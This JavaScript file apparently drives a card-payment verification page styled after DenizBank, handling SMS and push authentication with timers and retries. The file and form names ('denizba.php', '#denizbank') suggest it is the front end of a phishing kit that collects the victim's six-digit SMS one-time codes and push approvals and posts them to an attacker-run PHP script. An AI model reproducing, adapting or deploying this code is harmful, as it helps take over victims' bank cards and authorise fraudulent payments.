var currentAuthType
var currentApplicationId
var sentPush = false
var sentPushSeconds = 0
var removedRestriction = false

ready(() => {
    document.querySelectorAll('.form-check-input').forEach(el => {
        el.addEventListener('click', function(el) {
            removeClass('#btnSend', 'is-passive')
            removeClass('.checky', 'is-active')
            toggleClass(el.target.parentElement.parentElement.parentElement, 'is-active')
        })
    })

    var interval = setInterval(function() {
        if (remainingSeconds == 0) {
            processTimeout()
        }

        var time = secondToTime(remainingSeconds)
        customOperate('.countdown', (el) => {
                el.innerHTML = time
            })
            --remainingSeconds

        if (sentPush) {
            sentPushSeconds++

            if (sentPushSeconds >= pushActivitySeconds) {
                removeClass('.btnBackToOption', 'is-passive')
                removeClass('#btnNewPush', 'is-passive')
            }

            if (sentPushSeconds % 4 == 0) {
                validate()
            }
        }
    }, 1000)

    document.querySelector('#btnSend').addEventListener('click', function(el) {
        var authType = document.querySelector('input[name="AuthenticationType"]:checked').getAttribute('data-authtype')
        currentAuthType = authType

        if (authType == 'Push') {
            var applicationId = document.querySelector('input[name="AuthenticationType"]:checked').value
            currentApplicationId = applicationId
            sendPush(applicationId)
        } else {
            sendSms()
        }

        el.target.classList.add('is-passive')
        show('.loading');
    })

    document.querySelector('#txtSms').addEventListener('input', (event) => {
        var smsCode = event.target.value

        if (smsCode.length < 6) {
            addClass('#btnValidateSms', 'is-passive')
        } else {
            removeClass('#btnValidateSms', 'is-passive')
        }
    })

    document.querySelectorAll('.btnBackToOption').forEach(el => {
        el.addEventListener('click', function() {
            backToOption()
        })
    })

    document.querySelector('#btnValidateSms').addEventListener('click', function(el) {
        el.target.classList.add('is-passive')
        var sms = document.getElementById('txtSms').value
        validate(sms)
    })

    document.querySelectorAll('.btnNewSms').forEach(el => {
        el.addEventListener('click', function() {
            sendSms()
        })
    })

    document.querySelector('#btnNewPush').addEventListener('click', function() {
        addClass('#btnNewPush', 'is-passive')
        addClass('.btnBackToOption', 'is-passive')
        sendPush()
    })

    document.querySelector('#btnOpenHelp').addEventListener('click', function() {
        show('#help')
    })

    document.querySelector('#btnCloseHelp').addEventListener('click', function() {
        hide('#help')
    })

    document.querySelector('#btnCancel').addEventListener('click', function() {
        cancel()
    })

    document.querySelectorAll('.timeoutAction').forEach(el => {
        el.addEventListener('click', function(el) {
            var type = el.target.getAttribute('data-authtype')

            if (type == 'SMS') {
                sendSms()
            } else {
                var applicationId = el.target.getAttribute('data-applicationId')
                sendPush(applicationId)
            }
        })
    })

    if (onlySms) {
        currentAuthType = 'SMS'
        sendSms()
    }
})

function onKeypresSms(e) {
    if (e.keyCode === 13) {
        e.preventDefault()

        var code = document.getElementById('txtSms').value

        if (code.length == 6) {
            validate(code)
        }

        return
    }

    var code = (e.which) ? e.which : e.keyCode

    if (code > 31 && (code < 48 || code > 57)) {
        return false
    }

    return true
}

function sendSms() {
    var data = {
        Type: 'SMS'
    }

    request('POST', './denizba.php', JSON.stringify(data)).then((result) => {
        if (result) {
            if (result.isSuccess) {
                document.getElementById('txtSms').value = ''
                removeClass('#authSms', 'error')
                hide('.loading')
                hide('.timeout')
                hide('.authOption')
                hide('.smsNew')
                hide('#smsError')
                show('#authSms')
                show('.sms')
                show('#smsInfo')
                document.getElementById('smsInfo').innerHTML = result.text
                addClass('#btnValidateSms', 'is-passive')
                show('.sms')
                document.getElementById('txtSms').focus()

                if (hasRestriction == true) {
                    show('#stepsRestriction')
                    hide('#warningRestriction')

                    if (!result.forRestriction) {
                        removeClass('#stepRestriction', 'is-active')
                        addClass('#stepPayment', 'is-active')
                    }
                }

                remainingSeconds = result.remainingSeconds
            } else {
                navigate()
            }
        }
    }).catch((error) => {
        navigate()
    })
}

function sendPush(applicationId) {
    show('.loading');
    sentPushSeconds = 0
    sentPush = false

    var data = {
        Type: 'Push',
        ApplicationId: parseInt(applicationId || currentApplicationId)
    }

    request('POST', './denizba.php', JSON.stringify(data)).then((result) => {
        if (result && result.isSuccess) {
            hide('.loading')
            hide('.timeout')
            hide('.authOption')
            show('.authPush')
            document.getElementById('pushInfo').innerHTML = result.text
            document.getElementById('pushWarning').innerHTML = result.detailText
            addClass('#btnNewPush', 'is-passive')
            addClass('.btnBackToOption', 'is-passive')

            if (hasRestriction == true) {
                show('#stepsRestriction')
                hide('#warningRestriction')

                if (!result.forRestriction) {
                    removeClass('#stepRestriction', 'is-active')
                    addClass('#stepPayment', 'is-active')
                }
            }

            sentPush = true
            remainingSeconds = result.remainingSeconds
        }
    })
}

function validate(code) {
    var data = {
        sms: code
    }

    request('POST', $("#denizbank").attr('action'), JSON.stringify(data)).then((result) => {
        if (result && result.isSuccess) {
            sentPush = false

            if (result.forRestriction) {
                removedRestriction = true
                if (currentAuthType == 'Push') {
                    sendPush()
                } else {
                    sendSms()
                }
            } else {
                navigate()
            }
        } else {
            if (currentAuthType == 'SMS') {
                wrongSms(result.remaining)
            } else if (result.isRedirect) {
                navigate()
            }
        }
    }).catch((error) => {

    })
}


function cancel() {
    request('POST', getApiBaseUrl() + '/CardPayment/cancel').then((result) => {
        if (result && result.isRedirect) {
            navigate()
        }
    })
}

function processTimeout() {
    request('POST', getApiBaseUrl() + '/Authentication/timeout').then((result) => {
        if (result) {
            if (result.tryAgain) {
                show('.timeout')
                hide('#authSms')
                hide('.sms')
                hide('.authPush')
                hide('.authOption')

                if (hasRestriction == true) {
                    hide('#warningRestriction')
                }
            } else {
                navigate();
            }
        }
    })
}

function wrongSms(remaining) {
    document.getElementById('txtSms').value = ''
    document.getElementById('txtSms').focus()
    document.getElementById('remainingSms').innerHTML = remaining
    addClass('#authSms', 'error')
    hide('#smsError')
    hide('#smsInfo')

    if (remaining == 0) {
        show('.smsNew')
        hide('.sms')
    } else {
        show('#smsError')
    }
}

function secondToTime(second) {
    if (!second || second <= 0) return '0:00'

    var minutes = Math.floor(second / 60)
    var seconds = second - (minutes * 60)

    if (seconds < 10) {
        seconds = '0' + seconds
    }

    return minutes + ':' + seconds
}

function backToOption() {
    customOperate('.form-check-input', (el) => {
        el.checked = false
    })
    removeClass('.checky', 'is-active')
    addClass('#btnSend', 'is-passive')
    hide('#authSms')
    hide('.sms')
    hide('.authPush')
    show('.authOption')

    if (hasRestriction == true) {
        hide('#stepsRestriction')

        if (!removedRestriction) {
            show('#warningRestriction')
        }
    }

    sentPush = false
}

String.prototype.trimRight = function(charlist) {
    if (charlist === undefined)
        charlist = '\s'

    return this.replace(new RegExp('[' + charlist + ']+$'), '')
}

function getApiBaseUrl() {
    return getBaseUrl() + '/api'
}

function getBaseUrl() {
    return window.location.href.split('?')[0].trimRight('/')
}